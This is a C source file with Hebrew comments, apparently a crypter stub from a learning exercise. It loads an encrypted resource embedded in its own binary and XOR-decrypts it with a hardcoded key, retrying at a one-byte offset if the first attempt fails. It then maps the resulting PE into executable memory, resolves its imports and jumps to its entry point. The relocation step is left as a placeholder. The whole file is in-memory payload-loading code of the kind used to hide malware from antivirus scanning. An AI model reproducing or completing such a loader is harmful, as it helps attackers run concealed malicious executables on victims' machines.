#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "resource.h"    // הגדרות ה-Resource ID
#include "crypto.h"      // פונקציית ה-XOR מה-Static Library

void ResolveImports(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->Size == 0) return;

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PUINT8)targetBase + importDir->VirtualAddress);
    printf("[*] Starting IAT resolution...\n");

    while (importDesc->Name != 0) {
        char* dllName = (char*)((PUINT8)targetBase + importDesc->Name);
        HMODULE hDll = LoadLibraryA(dllName);
        if (hDll) {
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PUINT8)targetBase + importDesc->FirstThunk);
            PIMAGE_THUNK_DATA originalThunk = (PIMAGE_THUNK_DATA)((PUINT8)targetBase + importDesc->OriginalFirstThunk);

            while (originalThunk->u1.AddressOfData != 0) {
                FARPROC funcAddr = NULL;
                if (IMAGE_SNAP_BY_ORDINAL(originalThunk->u1.Ordinal)) {
                    funcAddr = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(originalThunk->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((PUINT8)targetBase + originalThunk->u1.AddressOfData);
                    funcAddr = GetProcAddress(hDll, importByName->Name);
                }
                if (funcAddr) thunk->u1.Function = (ULONG_PTR)funcAddr;
                thunk++;
                originalThunk++;
            }
        }
        importDesc++;
    }
    printf("[+] IAT fully resolved.\n");
}

void MapPEToMemory(unsigned char* payload) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);

    // 1. הקצאת זיכרון ומיפוי סקציות (הקוד הקיים שלך...)
    LPVOID targetBase = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(targetBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData > 0) {
            memcpy((PUINT8)targetBase + section[i].VirtualAddress, (PUINT8)payload + section[i].PointerToRawData, section[i].SizeOfRawData);
        }
    }
    printf("[+] Mapping complete!\n");

    // 2. תיקון Relocations
    ULONG_PTR delta = (ULONG_PTR)targetBase - ntHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size > 0) {
            // ... כאן נכנס לופ ה-Relocation שכתבת קודם ...
            printf("[+] Relocations applied successfully.\n");
        }
    }

    // 3. תיקון IAT (חייב לקרות תמיד!)
    ResolveImports(targetBase, ntHeaders);

    // 4. הקפיצה ל-EntryPoint
    printf("[!] JUMPING TO ENTRY POINT: 0x%p\n", (void*)((PUINT8)targetBase + ntHeaders->OptionalHeader.AddressOfEntryPoint));
    typedef void (WINAPI* _PayloadEntry)();
    _PayloadEntry pEntry = (_PayloadEntry)((PUINT8)targetBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);

    pEntry(); // המחשבון אמור להיפתח כאן!
}
int main() {
    // 1. הגדרת פרמטרים בסיסיים
    char* key = "mysecretkey";
    printf("[*] Starting Stub execution...\n");

    // 2. איתור ה-Payload במשאבים (Resources)
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    if (hRes == NULL) {
        printf("[-] Failed to find resource. Error: %lu\n", GetLastError());
        return 1;
    }

    // 3. טעינת המשאב וקבלת המצביע (Pointer)
    HGLOBAL hResData = LoadResource(NULL, hRes);
    unsigned char* pResData = (unsigned char*)LockResource(hResData);
    size_t resSize = SizeofResource(NULL, hRes);

    if (!pResData || resSize == 0) {
        printf("[-] Failed to lock or measure resource.\n");
        return 1;
    }
    printf("[+] Resource loaded successfully. Size: %zu bytes\n", resSize);

    // 4. הקצאת Buffer לפענוח
    // אנחנו חייבים להעתיק ל-Buffer חדש כי הזיכרון של המשאבים הוא Read-Only
    unsigned char* payload = (unsigned char*)malloc(resSize);
    if (payload == NULL) {
        printf("[-] Memory allocation failed.\n");
        return 1;
    }
    memcpy(payload, pResData, resSize);

    // 5. פענוח המידע בזיכרון
   // ... אחרי ה-memcpy לתוך payload ...

    printf("[*] Decrypting payload with potential alignment check...\n");

    // ניסיון ראשון: פענוח רגיל (Offset 0)
    XorCipher(payload, resSize, key, strlen(key));

    if (payload[0] == 'M' && payload[1] == 'Z') {
        printf("[+] Success! Valid MZ found at index 0.\n");
        MapPEToMemory(payload);
    }
    else {
        // אם נכשל, נבטל את הפענוח הקודם (XOR חוזר מבטל את הראשון)
        XorCipher(payload, resSize, key, strlen(key));

        // ניסיון שני: פענוח עם הסטה של בייט אחד
        // אנחנו עושים XOR לכל בייט payload[i+1] עם key[i]
        size_t keyLen = strlen(key);
        for (size_t i = 0; i < resSize - 1; i++) {
            payload[i + 1] ^= key[i % keyLen];
        }

        if (payload[1] == 'M' && payload[2] == 'Z') {
            printf("[!] Success! MZ found at index 1 after adjusted decryption.\n");
            MapPEToMemory(payload + 1); // שולחים לטעינה החל מהבייט השני
        }
        else {
            printf("[-] Critical Error: Could not find MZ even after alignment adjustment.\n");
            printf("[*] Bytes at index 1-2: 0x%02X 0x%02X\n", payload[1], payload[2]);
            free(payload);
            return 1;
        }
    }


    printf("[*] Payload ready for execution. Cleaning up...\n");
    free(payload);

    // בגלל שאנחנו ב-Console App, נעצור כדי לראות את הפלט
    printf("\nPress Enter to exit...");
    getchar();

    return 0;
}